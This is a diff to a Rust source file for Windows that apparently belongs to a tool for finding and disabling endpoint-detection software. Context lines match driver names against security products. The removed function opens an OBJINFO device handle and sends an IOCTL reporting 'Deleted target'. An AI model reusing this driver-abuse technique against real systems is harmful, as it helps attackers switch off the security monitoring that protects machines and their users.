@@ -1,18 +1,9 @@
-use std::ffi::{CStr, c_void, CString, OsString};
+use std::ffi::{OsString};
 use std::os::windows::ffi::OsStringExt;
-use std::ptr::{null, null_mut};
 
 use winapi::shared::minwindef::{DWORD, LPVOID};
 use winapi::um::errhandlingapi::GetLastError;
-use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
-use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-use winapi::um::ioapiset::DeviceIoControl;
 use winapi::um::psapi::{EnumDeviceDrivers, GetDeviceDriverBaseNameW};
-use winapi::um::winnt::{
-    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE,
-};
-
-
 
 
 /// Get the base address of a loaded driver (e.g., "ntoskrnl.exe" or "fltmgr.sys")
@@ -159,57 +150,5 @@ pub fn is_driver_name_matching_edr(driver: &str) -> bool {
     }
 
     false
-}
-
-
-pub fn get_driver_handle() {
-    let mut dw_return_val: u32 = 0;
-    let mut dw_bytes_returned: u32 = 0;
-
-    let cstr_device_name =
-        CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");
-
-    unsafe {
-        let h_device = CreateFileA(
-            cstr_device_name.as_ptr(),
-            GENERIC_READ | GENERIC_WRITE,
-            FILE_SHARE_READ | FILE_SHARE_WRITE,
-            null_mut(),
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            null_mut(),
-        );
-
-        if h_device.is_null() || h_device == INVALID_HANDLE_VALUE {
-            eprintln!(
-                "Failed to open handle to device. Error code: {}",
-                GetLastError()
-            );
-            return;
-        }
-
-        println!("[+] Opened handle to device");
-
-        let b_res = DeviceIoControl(
-            h_device,
-            0x8016E000,
-            null_mut(),
-            0,
-            &mut dw_return_val as *mut _ as *mut _,
-            std::mem::size_of::<u32>() as u32,
-            &mut dw_bytes_returned,
-            null_mut(),
-        );
-
-        if b_res == 0 || dw_return_val == 0 {
-            println!("[-] Delete failed");
-            CloseHandle(h_device);
-            eprintln!("[-] Error code: {}", GetLastError());
-        } else {
-            println!("[!] Deleted target");
-        }
-
-        CloseHandle(h_device);
-    }
 }
 
